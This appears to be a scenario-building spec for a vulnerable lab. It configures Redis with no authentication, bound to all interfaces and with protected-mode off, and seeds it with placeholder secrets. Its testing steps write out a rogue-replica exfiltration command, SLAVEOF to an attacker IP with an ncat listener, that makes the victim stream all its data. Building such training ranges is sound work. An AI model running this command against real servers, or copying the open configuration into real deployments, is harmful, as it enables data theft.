---
id: redis_replication_leak
description: Configures Redis with no authentication, bound to 0.0.0.0, and protected-mode disabled, allowing an attacker-controlled host to register as a rogue replica and pull all keys from the Redis master via the replication protocol.
required_vars: []
requires_service: redis
---
# Atom: Redis Replication Leak (Rogue Replica)
Redis replication requires no authentication handshake when `requirepass` is absent and `protected-mode` is off. An attacker who can reach the Redis port can issue `SLAVEOF <attacker_ip> <attacker_port>` (or `REPLICAOF` in newer Redis), causing the victim Redis to connect back to the attacker's listener and stream all key-value data in full. This attack (sometimes called "Redis Rogue Server") leaks the entire dataset without triggering authentication.

> **Redis is provided by the platform.** The `redis` service recipe (declared via `requires_service`) installs the correct package for the target distro and starts Redis already bound to all interfaces with no authentication and protected-mode off — the exact base this attack needs. The entity script MUST NOT install, configure, or start Redis. It only populates the keystore with the data to be leaked.

### Logic Requirements:
1. The platform's `redis` recipe has already configured Redis with no authentication, `bind 0.0.0.0`, and `protected-mode no` — the prerequisites for an unauthenticated rogue-replica sync. Do not re-apply or re-install.
2. Pre-populate Redis with the sensitive data to leak:
   ```bash
   redis-cli SET db_password "SensitiveSecret123"
   redis-cli SET api_key "sk-live-abc123def456"
   redis-cli SET session_token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
   ```

### Common Patterns:
- **Populate the keystore with realistic secrets:**
  ```bash
  redis-cli SET db_password "SensitiveSecret123"
  redis-cli SET api_key "sk-live-abc123def456"
  redis-cli SET session_token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
  ```
  Reuse these values elsewhere in the scenario (a DB login, an API endpoint) so the leak enables a realistic pivot.

### Testing Guidance:
1. Verify Redis is listening on 0.0.0.0:6379: `ss -tlnp | grep 6379`
2. Verify unauthenticated access: `redis-cli -h 127.0.0.1 ping` → `PONG`
3. Verify sensitive keys exist: `redis-cli -h 127.0.0.1 KEYS '*'` and `redis-cli -h 127.0.0.1 GET db_password`
4. **Rogue Replica Test (from attacker container):**
   On the attacker host, start a listener (e.g. using `redis-rogue-server` or `ncat -lvp 6380`), then:
   ```bash
   redis-cli -h <victim_ip> SLAVEOF <attacker_ip> 6380
   ```
   The victim Redis will initiate a full sync, streaming all data to the attacker.
5. Verify the `SLAVEOF` command is accepted: `redis-cli -h <victim_ip> INFO replication | grep role` — should show `role:slave`.

### Synthesis Guidance:
This atom extends `redis_disable_auth`: both rely on the platform `redis` recipe for an unauthenticated, all-interface Redis, and this atom additionally populates the keystore with sensitive data to leak. The entity must not install, configure, or start Redis — only `SET` the keys. The rogue replica attack itself is performed from the attacker container (`SLAVEOF <attacker_ip> <port>`) — the atom only sets up the victim-side data. Store credentials in Redis keys reused elsewhere in the scenario for a realistic pivot chain.
